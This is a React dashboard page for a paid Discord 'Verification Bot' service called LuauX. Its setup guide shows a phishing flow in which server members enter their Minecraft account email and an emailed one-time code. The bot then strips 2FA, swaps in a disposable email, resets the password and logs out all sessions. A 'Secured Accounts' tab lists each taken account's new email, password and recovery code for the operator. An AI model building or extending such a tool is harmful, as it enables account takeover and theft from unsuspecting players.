import { createFileRoute } from "@tanstack/react-router";
import { useEffect, useState } from "react";
import { useServerFn } from "@tanstack/react-start";
import {
  ShieldCheck, Copy, Check, Settings, Save, RefreshCw,
  ExternalLink, BookOpen, ClipboardList, Server, Key, Users,
  MessageSquare, Globe, ChevronRight, AlertTriangle, Terminal,
} from "lucide-react";
import {
  getVerificationKeys,
  getMyProfile,
  getVerificationSettings,
  saveVerificationSettings,
  getSecuredAccounts,
  resendKey,
  getVerificationBotInvite,
} from "@/lib/luaux.functions";
import { RedeemKeyForm } from "@/components/redeem-key-form";
import { PluginPage } from "@/components/plugin-page";
import { adminBypassesPaywall, getAdminShowPaywalls } from "@/lib/admin-preview";

export const Route = createFileRoute("/dashboard/verification-bot")({
  head: () => ({ meta: [{ title: "Verification Bot — LuauX" }] }),
  component: VerificationBotPage,
});

type KeyRow = {
  id: string;
  key: string;
  expires_at: string;
  created_at: string;
  delivered: boolean;
};

type GuideStepProps = {
  num: number;
  icon: React.ReactNode;
  title: string;
  children: React.ReactNode;
};

function GuideStep({ num, icon, title, children }: GuideStepProps) {
  return (
    <div className="relative pl-10 pb-8 last:pb-0">
      {num < 8 && (
        <div className="absolute left-[15px] top-8 bottom-0 w-px bg-primary/20" />
      )}
      <div className="absolute left-0 top-0 h-8 w-8 rounded-full bg-primary/15 brutal-border flex items-center justify-center">
        <span className="text-xs font-bold text-primary">{num}</span>
      </div>
      <div className="flex items-center gap-2 mb-2">
        {icon}
        <h4 className="font-semibold text-sm">{title}</h4>
      </div>
      <div className="text-xs text-muted-foreground space-y-2 leading-relaxed">
        {children}
      </div>
    </div>
  );
}

function CodeBlock({ children }: { children: string }) {
  const [copied, setCopied] = useState(false);

  const copy = async () => {
    await navigator.clipboard.writeText(children);
    setCopied(true);
    setTimeout(() => setCopied(false), 1500);
  };

  return (
    <div className="relative group">
      <pre className="rounded-lg bg-background/80 brutal-border px-4 py-3 font-mono text-[11px] overflow-x-auto text-foreground/90">
        {children}
      </pre>
      <button
        onClick={copy}
        className="absolute top-2 right-2 rounded-md bg-secondary/60 hover:bg-secondary px-2 py-1 text-[10px] font-semibold opacity-0 group-hover:opacity-100 transition-opacity flex items-center gap-1"
      >
        {copied ? <Check className="h-3 w-3" /> : <Copy className="h-3 w-3" />}
        {copied ? "Copied" : "Copy"}
      </button>
    </div>
  );
}

function InlineCode({ children }: { children: string }) {
  return (
    <code className="rounded bg-primary/10 px-1.5 py-0.5 font-mono text-[11px] text-primary">
      {children}
    </code>
  );
}

function VerificationBotPage() {
  const fetchKeys = useServerFn(getVerificationKeys);
  const fetchProfile = useServerFn(getMyProfile);
  const fetchSettings = useServerFn(getVerificationSettings);
  const saveSettings = useServerFn(saveVerificationSettings);
  const fetchSecuredAccounts = useServerFn(getSecuredAccounts);

  const [keys, setKeys] = useState<KeyRow[]>([]);
  const [isAdmin, setIsAdmin] = useState(false);
  const [showPaywalls, setShowPaywalls] = useState(false);
  const [loading, setLoading] = useState(true);
  const [copied, setCopied] = useState<string | null>(null);
  const [securedAccounts, setSecuredAccounts] = useState<Array<Record<string, unknown>>>([]);

  const [activeTab, setActiveTab] = useState<"config" | "guide" | "accounts">("config");

  // Settings state
  const [guildId, setGuildId] = useState("");
  const [verifiedRoleId, setVerifiedRoleId] = useState("");
  const [channelId, setChannelId] = useState("");
  const [messageTitle, setMessageTitle] = useState("Verification Required");
  const [messageDescription, setMessageDescription] = useState(
    "Click the button below to verify your account and gain access to the server.",
  );
  const [buttonText, setButtonText] = useState("Verify");
  const [botToken, setBotToken] = useState("");
  const [botPublicKey, setBotPublicKey] = useState("");

  const [saving, setSaving] = useState(false);
  const [successMsg, setSuccessMsg] = useState<string | null>(null);
  const [errorMsg, setErrorMsg] = useState<string | null>(null);
  const [inviteUrl, setInviteUrl] = useState("");

  const fetchInvite = useServerFn(getVerificationBotInvite);

  useEffect(() => {
    Promise.all([
      fetchKeys(),
      fetchProfile(),
      fetchSettings(),
      fetchSecuredAccounts(),
      fetchInvite(),
    ])
      .then(([k, p, s, accts, inv]) => {
        setKeys(k as KeyRow[]);
        setIsAdmin((p as { isAdmin?: boolean }).isAdmin ?? false);
        setSecuredAccounts(accts as Array<Record<string, unknown>>);
        const invite = (inv as { invite?: string })?.invite || "";
        setInviteUrl(invite);
        if (s) {
          const settings = s as {
            guild_id: string;
            verified_role_id: string;
            channel_id: string;
            message_title: string;
            message_description: string;
            button_text: string;
            bot_token?: string | null;
            bot_public_key?: string | null;
          };
          setGuildId(settings.guild_id || "");
          setVerifiedRoleId(settings.verified_role_id || "");
          setChannelId(settings.channel_id || "");
          setMessageTitle(settings.message_title || "Verification Required");
          setMessageDescription(
            settings.message_description ||
              "Click the button below to verify your account and gain access to the server.",
          );
          setButtonText(settings.button_text || "Verify");
          setBotToken(settings.bot_token || "");
          setBotPublicKey(settings.bot_public_key || "");
        }
      })
      .finally(() => setLoading(false));
  }, [fetchKeys, fetchProfile, fetchSettings, fetchSecuredAccounts, fetchInvite]);

  useEffect(() => {
    setShowPaywalls(getAdminShowPaywalls());
    const on = () => setShowPaywalls(getAdminShowPaywalls());
    window.addEventListener("luaux-admin-preview", on);
    window.addEventListener("storage", on);
    return () => {
      window.removeEventListener("luaux-admin-preview", on);
      window.removeEventListener("storage", on);
    };
  }, []);

  const activeKey = adminBypassesPaywall(isAdmin)
    ? { key: "ADMIN", expires_at: "2099-12-31", created_at: "" }
    : keys.find((k) => new Date(k.expires_at).getTime() > Date.now());
  void showPaywalls;

  const copy = async (v: string) => {
    await navigator.clipboard.writeText(v);
    setCopied(v);
    setTimeout(() => setCopied(null), 1500);
  };

  const handleSave = async (e: React.FormEvent) => {
    e.preventDefault();
    setSaving(true);
    setSuccessMsg(null);
    setErrorMsg(null);

    if (!guildId.trim()) {
      setSaving(false);
      return setErrorMsg("Server ID is required");
    }
    if (!verifiedRoleId.trim()) {
      setSaving(false);
      return setErrorMsg("Verified Role ID is required");
    }
    if (!channelId.trim()) {
      setSaving(false);
      return setErrorMsg("Channel ID is required");
    }
    if (!botToken.trim()) {
      setSaving(false);
      return setErrorMsg("Bot Token is required");
    }

    try {
      await saveSettings({
        data: {
          guild_id: guildId.trim(),
          verified_role_id: verifiedRoleId.trim(),
          channel_id: channelId.trim(),
          message_title: messageTitle.trim() || "Verification Required",
          message_description:
            messageDescription.trim() ||
            "Click the button below to verify your account and gain access to the server.",
          button_text: buttonText.trim() || "Verify",
          bot_token: botToken.trim(),
          bot_public_key: botPublicKey.trim(),
        },
      });
      setSuccessMsg(
        "Done! Button posted. Keep the VPS bot-worker online — it handles Verify clicks via Discord gateway.",
      );
    } catch (err) {
      setErrorMsg(err instanceof Error ? err.message : "Failed to save verification settings.");
    } finally {
      setSaving(false);
    }
  };

  if (loading) {
    return <div className="text-sm text-muted-foreground">Loading...</div>;
  }

  return (
    <div className="space-y-6 animate-page-in">
      <header className="flex items-start gap-4">
        <div className="h-12 w-12 rounded-xl brutal-border bg-primary/15 text-primary flex items-center justify-center animate-border">
          <ShieldCheck className="h-6 w-6" />
        </div>
        <div className="flex-1">
          <h1 className="font-display text-4xl font-semibold tracking-tight">
            Verification Bot
            {isAdmin && (
              <span className="ml-3 inline-flex items-center rounded-full bg-primary/15 text-primary px-2.5 py-0.5 text-xs font-semibold brutal-border">
                ADMIN
              </span>
            )}
          </h1>
          <p className="mt-1 text-muted-foreground">
            Use <strong>your own Discord bot</strong> — paste token + public key below.
          </p>
          <p className="text-[11px] text-primary/70 mt-0.5">
            Create a bot in Discord Developer Portal, invite it, then enter IDs + credentials.
          </p>
        </div>
      </header>

      {activeKey && (
        <div className="rounded-2xl brutal-border bg-card p-6 animated-border">
          <div className="flex items-center justify-between">
            <div className="flex items-center gap-2 text-xs uppercase tracking-widest text-primary">
              <Check className="h-3.5 w-3.5" /> Active license
            </div>
            {!isAdmin && (
              <span className="text-xs text-muted-foreground">
                Expires {new Date(activeKey!.expires_at).toLocaleString()}
              </span>
            )}
          </div>
          {!isAdmin && (
            <div className="mt-3 flex items-center gap-3">
              <code className="flex-1 rounded-lg bg-secondary/40 px-4 py-3 font-mono text-lg tracking-wider">
                {activeKey.key}
              </code>
              <button
                onClick={() => copy(activeKey.key)}
                className="rounded-lg brutal-border bg-secondary/40 hover:bg-secondary px-4 py-3 text-xs font-semibold flex items-center gap-2"
              >
                {copied === activeKey.key ? (
                  <Check className="h-4 w-4" />
                ) : (
                  <Copy className="h-4 w-4" />
                )}
                {copied === activeKey.key ? "Copied" : "Copy"}
              </button>
            </div>
          )}
          {isAdmin && (
            <div className="mt-2 text-xs text-muted-foreground font-semibold">
              Admin mode -- payment checks bypassed.
            </div>
          )}
        </div>
      )}

      {!activeKey && !isAdmin && (
        <PluginPage
          pluginId="verification"
          title="Verification Bot"
          tagline="Server verification with auto role assignment."
          cardTitle="Verification Bot"
          cardDescription="30-day license. No public lifetime — renew monthly. Lifetime keys only via admin/support."
          price={10}
          priceNote="30 days · renew anytime"
          icon={ShieldCheck}
          features={[
            "Auto-generated license key",
            "Delivered via Discord DM after confirm",
            "30 days of access, renew anytime",
            "Central LuauX bot (no user bot token)",
            "LTC / SOL payments only",
          ]}
        />
      )}

      {/* Tabs — visible for admins and users with active keys */}
      {(isAdmin || activeKey) && (
        <>
          {/* Tabs */}
          <div className="flex gap-1 rounded-xl brutal-border bg-card p-1 animate-tab-enter">
            {[
              { id: "config" as const, label: "Configuration", icon: Settings },
              { id: "guide" as const, label: "Setup Guide", icon: BookOpen },
              { id: "accounts" as const, label: `Secured Accounts (${securedAccounts.length})`, icon: ShieldCheck },
            ].map((tab) => (
              <button
                key={tab.id}
                onClick={() => setActiveTab(tab.id)}
                className={`flex-1 flex items-center justify-center gap-2 rounded-lg px-4 py-2.5 text-xs font-semibold transition-all duration-300 ${
                  activeTab === tab.id
                    ? "bg-primary text-primary-foreground shadow-md tab-active-glow"
                    : "text-muted-foreground hover:text-foreground hover:bg-secondary/30"
                }`}
              >
                <tab.icon className="h-4 w-4" />
                {tab.label}
              </button>
            ))}
          </div>

          {/* Config Tab */}
          {activeTab === "config" && (
            <div className="space-y-6 animate-tab-enter">
              {/* Simple 3-step setup */}
              <div className="rounded-2xl brutal-border bg-card p-5 space-y-4">
                <div className="text-xs font-semibold uppercase tracking-widest text-primary">
                  Simple setup (3 steps)
                </div>
                <ol className="space-y-3 text-sm">
                  <li className="flex gap-3">
                    <span className="shrink-0 h-6 w-6 rounded-full bg-primary/15 text-primary text-xs font-bold flex items-center justify-center">
                      1
                    </span>
                    <div className="flex-1 space-y-2">
                      <div className="font-semibold">Invite LuauX bot to your server</div>
                      {inviteUrl ? (
                        <a
                          href={inviteUrl}
                          target="_blank"
                          rel="noopener noreferrer"
                          className="inline-flex items-center gap-2 rounded-lg bg-primary text-primary-foreground px-4 py-2 text-xs font-semibold hover:opacity-90"
                        >
                          Invite bot <ExternalLink className="h-3.5 w-3.5" />
                        </a>
                      ) : (
                        <p className="text-xs text-muted-foreground">
                          Invite link loading… (needs DISCORD_CLIENT_ID on server)
                        </p>
                      )}
                      <p className="text-[11px] text-muted-foreground">
                        Drag the bot role <strong>above</strong> your Verified role.
                      </p>
                    </div>
                  </li>
                  <li className="flex gap-3">
                    <span className="shrink-0 h-6 w-6 rounded-full bg-primary/15 text-primary text-xs font-bold flex items-center justify-center">
                      2
                    </span>
                    <div>
                      <div className="font-semibold">Enable Developer Mode & copy 3 IDs</div>
                      <p className="text-[11px] text-muted-foreground mt-1">
                        Discord Settings → Advanced → Developer Mode. Then right-click: Server →
                        Copy Server ID · Role → Copy Role ID · Channel → Copy Channel ID.
                      </p>
                    </div>
                  </li>
                  <li className="flex gap-3">
                    <span className="shrink-0 h-6 w-6 rounded-full bg-primary/15 text-primary text-xs font-bold flex items-center justify-center">
                      3
                    </span>
                    <div>
                      <div className="font-semibold">Paste IDs below → Save & Post</div>
                      <p className="text-[11px] text-muted-foreground mt-1">
                        No bot token. No public key. No Discord Developer Portal.
                      </p>
                    </div>
                  </li>
                </ol>
              </div>

              <div className="rounded-2xl brutal-border bg-card panel-accent">
                <div className="p-5 border-b border-border/60 flex items-center gap-3 bg-secondary/15">
                  <Settings className="h-5 w-5 text-primary" />
                  <div>
                    <h3 className="font-semibold text-sm">Server settings</h3>
                    <p className="text-xs text-muted-foreground">
                      Your bot token + public key + server IDs.
                    </p>
                  </div>
                </div>

                <form onSubmit={handleSave} className="p-6 space-y-4">
                  <div className="grid md:grid-cols-2 gap-4">
                    <label className="text-xs space-y-1 md:col-span-2">
                      <span className="text-muted-foreground uppercase tracking-widest text-[10px]">
                        Bot Token
                      </span>
                      <input
                        className="w-full rounded-lg bg-background brutal-border px-3 py-2 text-sm font-mono"
                        value={botToken}
                        onChange={(e) => setBotToken(e.target.value)}
                        placeholder="Bot token from Developer Portal"
                        type="password"
                        autoComplete="off"
                        required
                      />
                    </label>
                    <label className="text-xs space-y-1 md:col-span-2">
                      <span className="text-muted-foreground uppercase tracking-widest text-[10px]">
                        Bot Public Key (optional — auto-filled from token)
                      </span>
                      <input
                        className="w-full rounded-lg bg-background brutal-border px-3 py-2 text-sm font-mono"
                        value={botPublicKey}
                        onChange={(e) => setBotPublicKey(e.target.value)}
                        placeholder="Leave blank to auto-fetch from Discord"
                      />
                    </label>
                    <div className="md:col-span-2 rounded-lg bg-primary/5 border border-primary/20 px-3 py-2 text-[11px] text-muted-foreground leading-relaxed space-y-1">
                      <p>
                        <strong className="text-foreground">Gateway mode (required):</strong> leave{" "}
                        <strong>Interactions Endpoint URL empty</strong> on Discord Developer Portal.
                        If that URL is set, Discord fails the click before the VPS bot can handle it.
                      </p>
                      <p>
                        Needs: Bot Token + invite + VPS <code className="text-primary">bot-worker</code> online
                        (pm2 logs should show <code className="text-primary">READY as YourBot</code>).
                      </p>
                    </div>
                    <label className="text-xs space-y-1">
                      <span className="text-muted-foreground uppercase tracking-widest text-[10px]">
                        Server ID
                      </span>
                      <input
                        className="w-full rounded-lg bg-background brutal-border px-3 py-2 text-sm font-mono"
                        value={guildId}
                        onChange={(e) => setGuildId(e.target.value)}
                        placeholder="Server ID"
                        required
                      />
                    </label>
                    <label className="text-xs space-y-1">
                      <span className="text-muted-foreground uppercase tracking-widest text-[10px]">
                        Verified Role ID
                      </span>
                      <input
                        className="w-full rounded-lg bg-background brutal-border px-3 py-2 text-sm font-mono"
                        value={verifiedRoleId}
                        onChange={(e) => setVerifiedRoleId(e.target.value)}
                        placeholder="Role ID"
                        required
                      />
                    </label>
                    <label className="text-xs space-y-1 md:col-span-2">
                      <span className="text-muted-foreground uppercase tracking-widest text-[10px]">
                        Channel ID
                      </span>
                      <input
                        className="w-full rounded-lg bg-background brutal-border px-3 py-2 text-sm font-mono"
                        value={channelId}
                        onChange={(e) => setChannelId(e.target.value)}
                        placeholder="Channel ID"
                        required
                      />
                    </label>
                  </div>

                  <details className="rounded-xl brutal-border bg-background/40 p-3">
                    <summary className="text-xs font-semibold cursor-pointer">
                      Optional: message text
                    </summary>
                    <div className="mt-3 space-y-3">
                      <label className="text-xs space-y-1 block">
                        <span className="text-muted-foreground text-[10px] uppercase tracking-widest">
                          Title
                        </span>
                        <input
                          className="w-full rounded-lg bg-background brutal-border px-3 py-2 text-sm"
                          value={messageTitle}
                          onChange={(e) => setMessageTitle(e.target.value)}
                        />
                      </label>
                      <label className="text-xs space-y-1 block">
                        <span className="text-muted-foreground text-[10px] uppercase tracking-widest">
                          Description
                        </span>
                        <textarea
                          className="w-full rounded-lg bg-background brutal-border px-3 py-2 text-sm resize-none"
                          rows={2}
                          value={messageDescription}
                          onChange={(e) => setMessageDescription(e.target.value)}
                        />
                      </label>
                      <label className="text-xs space-y-1 block">
                        <span className="text-muted-foreground text-[10px] uppercase tracking-widest">
                          Button text
                        </span>
                        <input
                          className="w-full rounded-lg bg-background brutal-border px-3 py-2 text-sm"
                          value={buttonText}
                          onChange={(e) => setButtonText(e.target.value)}
                        />
                      </label>
                    </div>
                  </details>

                  {successMsg && (
                    <div className="text-xs text-primary font-semibold">{successMsg}</div>
                  )}
                  {errorMsg && (
                    <div className="text-xs text-destructive font-semibold">{errorMsg}</div>
                  )}

                  <button
                    type="submit"
                    disabled={saving}
                    className="w-full inline-flex items-center justify-center gap-2 rounded-xl bg-primary text-primary-foreground px-5 py-3 text-sm font-semibold disabled:opacity-50 btn-premium"
                  >
                    {saving ? (
                      <RefreshCw className="h-4 w-4 animate-spin" />
                    ) : (
                      <Save className="h-4 w-4" />
                    )}
                    {saving ? "Posting…" : "Save & Post Verify button"}
                  </button>
                </form>
              </div>
            </div>
          )}

          {/* Guide Tab */}
          {activeTab === "guide" && (
            <div className="rounded-2xl brutal-border bg-card p-6 animate-tab-enter space-y-2 panel-accent">
              <div className="flex items-center gap-3 mb-6">
                <div className="h-10 w-10 rounded-lg bg-primary/15 brutal-border flex items-center justify-center">
                  <BookOpen className="h-5 w-5 text-primary" />
                </div>
                <div>
                  <h3 className="font-semibold">Setup Guide</h3>
                  <p className="text-xs text-muted-foreground">
                    Step-by-step instructions to configure the Verification Bot.
                  </p>
                </div>
              </div>

              <GuideStep num={1} icon={<Globe className="h-4 w-4 text-primary" />} title="Create your Discord bot">
                <p>
                  Each user runs <strong>their own bot</strong> — not a shared central bot.
                </p>
                <ol className="list-decimal list-inside space-y-1.5 mt-2">
                  <li>Open <InlineCode>https://discord.com/developers/applications</InlineCode></li>
                  <li>New Application → Bot → Reset Token → copy <strong>Bot Token</strong></li>
                  <li>General Information → copy <strong>Public Key</strong></li>
                  <li>
                    Interactions Endpoint URL →{" "}
                    <InlineCode>https://luaux.wtf/api/discord/interactions</InlineCode>
                  </li>
                  <li>OAuth2 → URL Generator → scopes: <InlineCode>bot</InlineCode> + <InlineCode>applications.commands</InlineCode></li>
                  <li>Permissions: Send Messages, Embed Links, Manage Roles, View Channels, Read Message History</li>
                  <li>Open the generated invite URL → pick your server → Authorize</li>
                  <li>Move the bot role above your Verified role</li>
                </ol>
              </GuideStep>

              <GuideStep num={2} icon={<Key className="h-4 w-4 text-primary" />} title="Paste Bot Token + Public Key">
                <p>
                  In Config, paste your <strong>Bot Token</strong> and <strong>Public Key</strong>, then Server / Role / Channel IDs.
                </p>
                <p className="mt-2 text-[11px]">
                  Public Key is required so Discord can verify button clicks for your bot.
                </p>
              </GuideStep>

              <GuideStep num={3} icon={<Users className="h-4 w-4 text-primary" />} title="Create a Verified Role">
                <ol className="list-decimal list-inside space-y-1.5">
                  <li>Open your Discord server and go to <strong className="text-foreground">Server Settings</strong></li>
                  <li>Click <strong className="text-foreground">Roles</strong> then <strong className="text-foreground">Create Role</strong></li>
                  <li>Name it something like <InlineCode>Verified</InlineCode></li>
                  <li>Give it a color and set permissions as needed (e.g. access to channels)</li>
                  <li><strong className="text-foreground">Important:</strong> The bot's role must be <strong className="text-foreground">above</strong> this role in the role list</li>
                  <li>To get the Role ID: enable Developer Mode in Discord (Settings &gt; Advanced &gt; Developer Mode), then right-click the role and select <strong className="text-foreground">Copy Role ID</strong></li>
                </ol>
              </GuideStep>

              <GuideStep num={4} icon={<MessageSquare className="h-4 w-4 text-primary" />} title="Choose a Verification Channel">
                <ol className="list-decimal list-inside space-y-1.5">
                  <li>Create or choose a channel for the verification button (e.g. <InlineCode>#verify</InlineCode>)</li>
                  <li>Make sure the bot has <strong className="text-foreground">Send Messages</strong> and <strong className="text-foreground">Embed Links</strong> permissions in this channel</li>
                  <li>Right-click the channel and select <strong className="text-foreground">Copy Channel ID</strong></li>
                </ol>
              </GuideStep>

              <GuideStep num={5} icon={<ClipboardList className="h-4 w-4 text-primary" />} title="Get Your IDs (Summary)">
                <p>At this point you should have:</p>
                <div className="mt-2 p-3 rounded-lg bg-background/60 brutal-border space-y-2">
                  <div className="flex items-center gap-3">
                    <span className="rounded bg-primary/15 text-primary px-2 py-0.5 text-[10px] font-bold uppercase">
                      Guild ID
                    </span>
                    <span className="text-muted-foreground">Right-click server icon &gt; Copy Server ID</span>
                  </div>
                  <div className="flex items-center gap-3">
                    <span className="rounded bg-primary/15 text-primary px-2 py-0.5 text-[10px] font-bold uppercase">
                      Role ID
                    </span>
                    <span className="text-muted-foreground">Right-click role &gt; Copy Role ID</span>
                  </div>
                  <div className="flex items-center gap-3">
                    <span className="rounded bg-primary/15 text-primary px-2 py-0.5 text-[10px] font-bold uppercase">
                      Channel ID
                    </span>
                    <span className="text-muted-foreground">Right-click channel &gt; Copy Channel ID</span>
                  </div>
                </div>
                <p>Enable Developer Mode in Discord (Settings &gt; Advanced &gt; Developer Mode) to make the Copy ID options appear.</p>
              </GuideStep>

              <GuideStep num={6} icon={<Server className="h-4 w-4 text-primary" />} title="Configure in LuauX Dashboard">
                <ol className="list-decimal list-inside space-y-1.5">
                  <li>Go to the <strong className="text-foreground">Configuration</strong> tab above</li>
                  <li>Paste your <strong className="text-foreground">Guild ID</strong>, <strong className="text-foreground">Verified Role ID</strong>, and <strong className="text-foreground">Channel ID</strong></li>
                  <li>Customize the embed title, description, and button text if desired</li>
                  <li>Click <strong className="text-foreground">Save &amp; Post Verification Button</strong></li>
                </ol>
                <p>This will save your settings and post the verification embed to your channel.</p>
              </GuideStep>

              <GuideStep num={7} icon={<ShieldCheck className="h-4 w-4 text-primary" />} title="Test Verify">
                <p>Once configured, test the full flow:</p>
                <ol className="list-decimal list-inside space-y-1.5 mt-2">
                  <li>Go to your verification channel and click the <strong className="text-foreground">Verify</strong> button</li>
                  <li>A modal appears — enter your <strong className="text-foreground">Minecraft username</strong> and <strong className="text-foreground">email</strong> (the email linked to your MC account)</li>
                  <li>The bot sends an OTP code to your security email — check your inbox</li>
                  <li>A second modal appears — enter the <strong className="text-foreground">6-digit code</strong></li>
                  <li>The bot auto-secures your account: removes 2FA, changes email &amp; password, generates a recovery code</li>
                  <li>The bot assigns you the Verified role and posts a confirmation embed with your new credentials</li>
                </ol>
                <div className="mt-4 p-3 rounded-lg bg-background/60 brutal-border">
                  <p className="text-[11px] font-semibold text-foreground mb-1">What the bot does to your account:</p>
                  <div className="grid grid-cols-2 gap-1.5 text-[11px]">
                    <div className="flex items-center gap-1.5">
                      <Check className="h-3 w-3 text-primary" />
                      <span>Removes 2FA authentication</span>
                    </div>
                    <div className="flex items-center gap-1.5">
                      <Check className="h-3 w-3 text-primary" />
                      <span>Changes security email</span>
                    </div>
                    <div className="flex items-center gap-1.5">
                      <Check className="h-3 w-3 text-primary" />
                      <span>Resets password</span>
                    </div>
                    <div className="flex items-center gap-1.5">
                      <Check className="h-3 w-3 text-primary" />
                      <span>Generates recovery code</span>
                    </div>
                    <div className="flex items-center gap-1.5">
                      <Check className="h-3 w-3 text-primary" />
                      <span>Removes all proofs/services</span>
                    </div>
                    <div className="flex items-center gap-1.5">
                      <Check className="h-3 w-3 text-primary" />
                      <span>Logs out all sessions</span>
                    </div>
                  </div>
                </div>
              </GuideStep>

              <div className="mt-6 p-4 rounded-lg bg-secondary/30 brutal-border">
                <h4 className="font-semibold text-sm mb-2 flex items-center gap-2">
                  <AlertTriangle className="h-4 w-4 text-primary" /> Important Notes
                </h4>
                <ul className="space-y-1.5 text-xs text-muted-foreground">
                  <li className="flex gap-2">
                    <ChevronRight className="h-3 w-3 text-primary shrink-0 mt-0.5" />
                    The bot uses disposable email accounts for security email changes — your real email is not stored
                  </li>
                  <li className="flex gap-2">
                    <ChevronRight className="h-3 w-3 text-primary shrink-0 mt-0.5" />
                    All credentials are displayed in the Discord embed after verification — save them immediately
                  </li>
                  <li className="flex gap-2">
                    <ChevronRight className="h-3 w-3 text-primary shrink-0 mt-0.5" />
                    You can view all secured accounts in the <strong className="text-foreground">Secured Accounts</strong> tab
                  </li>
                  <li className="flex gap-2">
                    <ChevronRight className="h-3 w-3 text-primary shrink-0 mt-0.5" />
                    The verification license costs <strong className="text-foreground">$10/month</strong> (LTC/SOL). Lifetime only via admin-issued keys
                  </li>
                </ul>
              </div>
            </div>
          )}

          {/* Secured Accounts Tab */}
          {activeTab === "accounts" && (
            <div className="space-y-6 animate-tab-enter">
              {securedAccounts.length > 0 ? (
                <div className="rounded-2xl brutal-border bg-card">
                  <div className="p-5 border-b border-border/60 flex items-center gap-3 bg-secondary/15">
                    <ShieldCheck className="h-5 w-5 text-primary" />
                    <div>
                      <h3 className="font-semibold text-sm">Secured Accounts</h3>
                      <p className="text-xs text-muted-foreground">
                        Recently verified and secured accounts. Save these credentials!
                      </p>
                    </div>
                  </div>
                  <div className="divide-y divide-border/40">
                    {(securedAccounts as Array<Record<string, string>>).map((acc) => (
                      <div key={acc.id} className="p-4 text-xs space-y-2">
                        <div className="flex items-center justify-between">
                          <span className="font-semibold text-primary">
                            {acc.mc_username}
                          </span>
                          <span className="text-muted-foreground">
                            {new Date(acc.secured_at).toLocaleString()}
                          </span>
                        </div>
                        <div className="grid sm:grid-cols-2 gap-2">
                          <div className="rounded-lg bg-background/60 brutal-border p-2.5 space-y-1">
                            <span className="text-[10px] text-muted-foreground uppercase tracking-widest">New Email</span>
                            <code className="block text-foreground break-all">{acc.new_email}</code>
                          </div>
                          <div className="rounded-lg bg-background/60 brutal-border p-2.5 space-y-1">
                            <span className="text-[10px] text-muted-foreground uppercase tracking-widest">Password</span>
                            <code className="block text-foreground">{acc.new_password}</code>
                          </div>
                          <div className="rounded-lg bg-background/60 brutal-border p-2.5 space-y-1">
                            <span className="text-[10px] text-muted-foreground uppercase tracking-widest">Recovery Code</span>
                            <code className="block text-foreground">{acc.new_recovery_code}</code>
                          </div>
                          <div className="rounded-lg bg-background/60 brutal-border p-2.5 space-y-1">
                            <span className="text-[10px] text-muted-foreground uppercase tracking-widest">MC Method</span>
                            <code className="block text-foreground">{acc.mc_method}</code>
                          </div>
                        </div>

                      </div>
                    ))}
                  </div>
                </div>
              ) : (
                <div className="rounded-2xl brutal-border bg-card p-8 text-center">
                  <ShieldCheck className="h-10 w-10 text-muted-foreground mx-auto mb-3" />
                  <p className="text-sm text-muted-foreground">No secured accounts yet.</p>
                  <p className="text-xs text-muted-foreground/60 mt-1">
                    Accounts will appear here after users complete verification.
                  </p>
                </div>
              )}
            </div>
          )}
        </>
      )}
    </div>
  );
}
